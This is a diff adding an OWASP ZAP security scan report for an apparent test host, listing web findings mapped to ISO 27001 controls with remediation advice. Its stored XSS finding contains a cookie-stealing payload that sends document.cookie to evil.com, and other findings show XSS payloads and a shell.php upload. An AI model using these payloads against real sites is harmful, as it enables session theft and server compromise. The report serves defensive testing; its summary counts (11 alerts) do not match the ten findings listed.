@@ -1,0 +1,353 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<OWASPZAPReport version="2.15.0" generated="2025-06-20T16:45:00-0600">
+  <site name="https://sgsi.acme-corp.com" host="sgsi.acme-corp.com" port="443" ssl="true">
+    <alerts>
+      <!-- A.8.26 Application Security Requirements -->
+      <alertitem>
+        <pluginid>40012</pluginid>
+        <alertRef>40012</alertRef>
+        <alert>Cross Site Scripting (Reflected)</alert>
+        <name>Cross Site Scripting (Reflected)</name>
+        <riskcode>3</riskcode>
+        <confidence>2</confidence>
+        <riskdesc>High (Medium)</riskdesc>
+        <desc>Cross-site scripting (XSS) vulnerability found. User input is reflected in the response without proper encoding, allowing execution of arbitrary JavaScript in the context of the victim's browser session.</desc>
+        <instances>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/search?q=test</uri>
+            <method>GET</method>
+            <param>q</param>
+            <attack>&lt;script&gt;alert(1)&lt;/script&gt;</attack>
+            <evidence>&lt;script&gt;alert(1)&lt;/script&gt;</evidence>
+          </instance>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/reports/view?name=test</uri>
+            <method>GET</method>
+            <param>name</param>
+            <attack>&lt;img src=x onerror=alert(1)&gt;</attack>
+            <evidence>&lt;img src=x onerror=alert(1)&gt;</evidence>
+          </instance>
+        </instances>
+        <count>2</count>
+        <solution>Validate and encode all user input before including it in HTML output. Use Content-Security-Policy headers. Implement output encoding libraries appropriate for the context (HTML, JavaScript, URL, CSS).</solution>
+        <reference>https://owasp.org/www-community/attacks/xss/</reference>
+        <cweid>79</cweid>
+        <wascid>8</wascid>
+        <sourceid>1</sourceid>
+        <iso_control>A.8.26</iso_control>
+      </alertitem>
+
+      <alertitem>
+        <pluginid>40014</pluginid>
+        <alertRef>40014</alertRef>
+        <alert>Cross Site Scripting (Persistent)</alert>
+        <name>Cross Site Scripting (Persistent/Stored)</name>
+        <riskcode>3</riskcode>
+        <confidence>3</confidence>
+        <riskdesc>High (High)</riskdesc>
+        <desc>Stored XSS vulnerability detected in user profile fields. Malicious scripts injected via the display name field are rendered to other authenticated users viewing team directories.</desc>
+        <instances>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/api/profile/update</uri>
+            <method>POST</method>
+            <param>display_name</param>
+            <attack>&lt;svg onload=fetch('https://evil.com/steal?c='+document.cookie)&gt;</attack>
+            <evidence>Payload rendered at /team/directory without encoding</evidence>
+          </instance>
+        </instances>
+        <count>1</count>
+        <solution>Sanitize all user input on storage. Apply context-appropriate output encoding. Implement CSP with strict-dynamic directive.</solution>
+        <reference>https://owasp.org/www-community/attacks/xss/#stored-xss-attacks</reference>
+        <cweid>79</cweid>
+        <wascid>8</wascid>
+        <sourceid>1</sourceid>
+        <iso_control>A.8.26</iso_control>
+      </alertitem>
+
+      <!-- A.8.5 Secure Authentication -->
+      <alertitem>
+        <pluginid>10057</pluginid>
+        <alertRef>10057</alertRef>
+        <alert>Username Enumeration</alert>
+        <name>Username Enumeration via Login Response Timing</name>
+        <riskcode>2</riskcode>
+        <confidence>2</confidence>
+        <riskdesc>Medium (Medium)</riskdesc>
+        <desc>The login endpoint responds with measurably different timing for valid vs invalid usernames. Valid usernames take 340ms (password hash comparison) while invalid usernames return in 12ms, enabling enumeration of valid accounts.</desc>
+        <instances>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/api/auth/login</uri>
+            <method>POST</method>
+            <param>username</param>
+            <attack>admin@acme-corp.com (340ms) vs nonexistent@test.com (12ms)</attack>
+            <evidence>Response time differential: 328ms</evidence>
+          </instance>
+        </instances>
+        <count>1</count>
+        <solution>Implement constant-time comparison for authentication. Return identical responses and timing regardless of username validity. Consider implementing account lockout after failed attempts.</solution>
+        <reference>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account</reference>
+        <cweid>203</cweid>
+        <wascid>45</wascid>
+        <sourceid>3</sourceid>
+        <iso_control>A.8.5</iso_control>
+      </alertitem>
+
+      <alertitem>
+        <pluginid>10023</pluginid>
+        <alertRef>10023</alertRef>
+        <alert>Absence of Anti-CSRF Tokens</alert>
+        <name>Absence of Anti-CSRF Tokens</name>
+        <riskcode>2</riskcode>
+        <confidence>2</confidence>
+        <riskdesc>Medium (Medium)</riskdesc>
+        <desc>No anti-CSRF tokens were found in forms that perform state-changing operations. An attacker could craft a malicious page that submits requests on behalf of authenticated users.</desc>
+        <instances>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/settings/password/change</uri>
+            <method>POST</method>
+            <param></param>
+            <evidence>No CSRF token in form or headers</evidence>
+          </instance>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/admin/users/delete</uri>
+            <method>POST</method>
+            <param></param>
+            <evidence>No CSRF token in form or headers</evidence>
+          </instance>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/api/audit/approve</uri>
+            <method>POST</method>
+            <param></param>
+            <evidence>No CSRF token in form or headers</evidence>
+          </instance>
+        </instances>
+        <count>3</count>
+        <solution>Implement anti-CSRF tokens using the Synchronizer Token Pattern or Double Submit Cookie pattern. Use SameSite cookie attribute.</solution>
+        <reference>https://owasp.org/www-community/attacks/csrf</reference>
+        <cweid>352</cweid>
+        <wascid>9</wascid>
+        <sourceid>3</sourceid>
+        <iso_control>A.8.26</iso_control>
+      </alertitem>
+
+      <!-- A.8.3 Information Access Restriction -->
+      <alertitem>
+        <pluginid>40003</pluginid>
+        <alertRef>40003</alertRef>
+        <alert>Insecure Direct Object Reference (IDOR)</alert>
+        <name>Insecure Direct Object Reference</name>
+        <riskcode>3</riskcode>
+        <confidence>3</confidence>
+        <riskdesc>High (High)</riskdesc>
+        <desc>The application allows access to other users' audit reports by modifying the report_id parameter. No server-side authorization check verifies the requesting user owns or has permission to access the specified resource.</desc>
+        <instances>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/api/reports/1542</uri>
+            <method>GET</method>
+            <param>report_id</param>
+            <attack>Changed report_id from 1540 (own) to 1542 (other user)</attack>
+            <evidence>HTTP 200 with full report content of another user</evidence>
+          </instance>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/api/documents/download/3891</uri>
+            <method>GET</method>
+            <param>document_id</param>
+            <attack>Sequential ID enumeration reveals all uploaded documents</attack>
+            <evidence>HTTP 200 with confidential document content</evidence>
+          </instance>
+        </instances>
+        <count>2</count>
+        <solution>Implement proper authorization checks on every object access. Use indirect references (UUIDs) instead of sequential IDs. Validate resource ownership on the server side before returning data.</solution>
+        <reference>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References</reference>
+        <cweid>639</cweid>
+        <wascid>2</wascid>
+        <sourceid>3</sourceid>
+        <iso_control>A.8.3</iso_control>
+      </alertitem>
+
+      <!-- A.8.24 Use of Cryptography -->
+      <alertitem>
+        <pluginid>10096</pluginid>
+        <alertRef>10096</alertRef>
+        <alert>Insufficient Transport Layer Protection</alert>
+        <name>Weak TLS Configuration</name>
+        <riskcode>2</riskcode>
+        <confidence>3</confidence>
+        <riskdesc>Medium (High)</riskdesc>
+        <desc>The server supports TLS 1.0 and TLS 1.1 protocols which are deprecated and contain known vulnerabilities (BEAST, POODLE). Additionally, weak cipher suites (RC4, 3DES) are accepted.</desc>
+        <instances>
+          <instance>
+            <uri>https://sgsi.acme-corp.com</uri>
+            <method>GET</method>
+            <param></param>
+            <evidence>TLSv1.0 negotiated with TLS_RSA_WITH_RC4_128_SHA</evidence>
+          </instance>
+        </instances>
+        <count>1</count>
+        <solution>Disable TLS 1.0 and TLS 1.1. Only allow TLS 1.2+ with strong cipher suites (AES-GCM, ChaCha20). Configure proper cipher ordering with server preference.</solution>
+        <reference>https://wiki.mozilla.org/Security/Server_Side_TLS</reference>
+        <cweid>326</cweid>
+        <wascid>15</wascid>
+        <sourceid>2</sourceid>
+        <iso_control>A.8.24</iso_control>
+      </alertitem>
+
+      <!-- A.8.15 Logging -->
+      <alertitem>
+        <pluginid>10027</pluginid>
+        <alertRef>10027</alertRef>
+        <alert>Information Disclosure - Sensitive Information in HTTP Response</alert>
+        <name>Sensitive Data Exposure in Error Responses</name>
+        <riskcode>2</riskcode>
+        <confidence>2</confidence>
+        <riskdesc>Medium (Medium)</riskdesc>
+        <desc>Application error responses contain sensitive information including full stack traces, database connection strings, internal IP addresses, and framework version numbers. This information facilitates targeted attacks.</desc>
+        <instances>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/api/reports/invalid</uri>
+            <method>GET</method>
+            <param></param>
+            <evidence>Stack trace reveals: PostgreSQL 14.2, Django 4.1.3, internal IP 10.0.3.45</evidence>
+          </instance>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/api/auth/login</uri>
+            <method>POST</method>
+            <param></param>
+            <evidence>Error reveals database schema: users.password_hash column type</evidence>
+          </instance>
+        </instances>
+        <count>2</count>
+        <solution>Implement custom error pages that do not reveal internal details. Log full errors server-side only. Remove version headers (X-Powered-By, Server).</solution>
+        <reference>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/</reference>
+        <cweid>200</cweid>
+        <wascid>13</wascid>
+        <sourceid>3</sourceid>
+        <iso_control>A.8.15</iso_control>
+      </alertitem>
+
+      <!-- A.8.9 Configuration Management -->
+      <alertitem>
+        <pluginid>10035</pluginid>
+        <alertRef>10035</alertRef>
+        <alert>Strict-Transport-Security Header Not Set</alert>
+        <name>Missing Security Headers</name>
+        <riskcode>1</riskcode>
+        <confidence>3</confidence>
+        <riskdesc>Low (High)</riskdesc>
+        <desc>Multiple security headers are missing from HTTP responses: Strict-Transport-Security, X-Content-Type-Options, X-Frame-Options, Permissions-Policy, and Referrer-Policy.</desc>
+        <instances>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/</uri>
+            <method>GET</method>
+            <param></param>
+            <evidence>Missing headers: HSTS, X-Content-Type-Options, X-Frame-Options, Permissions-Policy</evidence>
+          </instance>
+        </instances>
+        <count>1</count>
+        <solution>Add the following headers: Strict-Transport-Security: max-age=31536000; includeSubDomains, X-Content-Type-Options: nosniff, X-Frame-Options: DENY, Referrer-Policy: strict-origin-when-cross-origin, Permissions-Policy: geolocation=(), camera=(), microphone=()</solution>
+        <reference>https://owasp.org/www-project-secure-headers/</reference>
+        <cweid>693</cweid>
+        <wascid>15</wascid>
+        <sourceid>3</sourceid>
+        <iso_control>A.8.9</iso_control>
+      </alertitem>
+
+      <!-- A.8.12 Data Leakage Prevention -->
+      <alertitem>
+        <pluginid>10049</pluginid>
+        <alertRef>10049</alertRef>
+        <alert>Sensitive Data in URL</alert>
+        <name>Authentication Token Passed in URL Parameter</name>
+        <riskcode>2</riskcode>
+        <confidence>3</confidence>
+        <riskdesc>Medium (High)</riskdesc>
+        <desc>Authentication tokens are passed as URL query parameters instead of in HTTP headers or cookies. This exposes tokens in browser history, server logs, proxy logs, and Referer headers sent to third parties.</desc>
+        <instances>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/dashboard?token=eyJhbGciOiJIUzI1NiJ9.xxx</uri>
+            <method>GET</method>
+            <param>token</param>
+            <evidence>JWT token visible in URL query string</evidence>
+          </instance>
+        </instances>
+        <count>1</count>
+        <solution>Pass authentication tokens in HTTP Authorization headers or secure, HttpOnly cookies. Never include sensitive data in URLs.</solution>
+        <reference>https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url</reference>
+        <cweid>598</cweid>
+        <wascid>13</wascid>
+        <sourceid>3</sourceid>
+        <iso_control>A.8.12</iso_control>
+      </alertitem>
+
+      <!-- A.8.25 Secure Development Life Cycle -->
+      <alertitem>
+        <pluginid>90033</pluginid>
+        <alertRef>90033</alertRef>
+        <alert>Loosely Scoped Cookie</alert>
+        <name>Cookie Without Secure Attributes</name>
+        <riskcode>1</riskcode>
+        <confidence>3</confidence>
+        <riskdesc>Low (High)</riskdesc>
+        <desc>Session cookies are set without the Secure, HttpOnly, and SameSite attributes, making them vulnerable to interception over HTTP, access via JavaScript (XSS exploitation), and cross-site request inclusion.</desc>
+        <instances>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/api/auth/login</uri>
+            <method>POST</method>
+            <param>Set-Cookie</param>
+            <evidence>Set-Cookie: session_id=abc123; Path=/</evidence>
+          </instance>
+        </instances>
+        <count>1</count>
+        <solution>Set cookies with: Secure; HttpOnly; SameSite=Strict (or Lax for cross-origin navigation). Configure appropriate Path and Domain restrictions.</solution>
+        <reference>https://owasp.org/www-community/controls/SecureCookieAttribute</reference>
+        <cweid>614</cweid>
+        <wascid>13</wascid>
+        <sourceid>3</sourceid>
+        <iso_control>A.8.25</iso_control>
+      </alertitem>
+
+      <!-- A.8.7 Protection Against Malware -->
+      <alertitem>
+        <pluginid>10110</pluginid>
+        <alertRef>10110</alertRef>
+        <alert>File Upload Without Validation</alert>
+        <name>Unrestricted File Upload Allows Executable Content</name>
+        <riskcode>3</riskcode>
+        <confidence>2</confidence>
+        <riskdesc>High (Medium)</riskdesc>
+        <desc>The file upload endpoint accepts files without content-type validation, file extension checking, or malware scanning. Uploaded files are stored in a publicly accessible directory and can be executed by the web server.</desc>
+        <instances>
+          <instance>
+            <uri>https://sgsi.acme-corp.com/api/documents/upload</uri>
+            <method>POST</method>
+            <param>file</param>
+            <attack>Uploaded shell.php with application/pdf content-type header</attack>
+            <evidence>File accessible and executable at /uploads/shell.php</evidence>
+          </instance>
+        </instances>
+        <count>1</count>
+        <solution>Validate file content type using magic bytes (not just Content-Type header). Restrict allowed extensions. Store uploads outside web root. Implement antivirus scanning. Rename files with random UUIDs.</solution>
+        <reference>https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload</reference>
+        <cweid>434</cweid>
+        <wascid>38</wascid>
+        <sourceid>1</sourceid>
+        <iso_control>A.8.7</iso_control>
+      </alertitem>
+    </alerts>
+  </site>
+
+  <scan_summary>
+    <target>https://sgsi.acme-corp.com</target>
+    <start_time>2025-06-20T15:00:00-0600</start_time>
+    <end_time>2025-06-20T16:45:00-0600</end_time>
+    <duration_minutes>105</duration_minutes>
+    <urls_scanned>342</urls_scanned>
+    <alerts_total>11</alerts_total>
+    <alerts_high>4</alerts_high>
+    <alerts_medium>5</alerts_medium>
+    <alerts_low>2</alerts_low>
+    <alerts_informational>0</alerts_informational>
+    <scan_mode>Standard</scan_mode>
+    <authentication>Form-based (admin@acme-corp.com)</authentication>
+  </scan_summary>
+</OWASPZAPReport>
